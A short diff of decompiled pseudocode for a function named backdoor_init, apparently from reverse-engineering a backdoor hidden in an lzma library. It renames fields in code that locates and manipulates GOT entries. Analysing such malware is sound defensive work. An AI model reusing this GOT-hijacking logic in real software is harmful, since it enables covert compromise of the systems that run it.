@@ -24,8 +24,8 @@ void * backdoor_init(elf_entry_ctx_t *state,u64 *caller_frame)
   (state->got_ctx).got_offset = (ptrdiff_t)state;
   init_elf_entry_ctx(state);
   reloc_consts = PTR__Llzma_block_buffer_decode_0_0010e000;
-  state->frame_address = (u64 *)(state->got_ctx).return_address;
-  got_base = (void *)((long)state->symbol_ptr - (state->got_ctx).got_offset);
+  state->resolver_frame = (u64 *)(state->got_ctx).return_address;
+  got_base = (void *)((long)state->cpuid_random_symbol_addr - (state->got_ctx).got_offset);
   (state->got_ctx).got_ptr = got_base;
   got_slot = (long *)((long)got_base + *(long *)(reloc_consts + 8));
   (state->got_ctx).return_address = got_slot;
